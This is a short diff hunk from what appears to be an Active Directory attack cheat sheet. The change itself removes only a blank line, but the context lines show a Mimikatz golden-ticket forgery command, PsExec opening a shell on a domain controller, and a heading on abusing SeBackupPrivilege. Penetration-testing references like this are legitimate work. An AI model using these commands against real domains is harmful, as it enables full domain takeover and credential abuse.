@@ -326,7 +326,6 @@ kerberos::golden /user:$USER /domain:$TARGET_AD /sid:$TARGET_SID /krbtgt:$HASH /
 misc::cmd
 PsExec.exe \\$DOMAIN_CONTROLLER cmd.exe
 ```
-
 Abuse SeBackupPrivilege
 ---
 ```poweshell
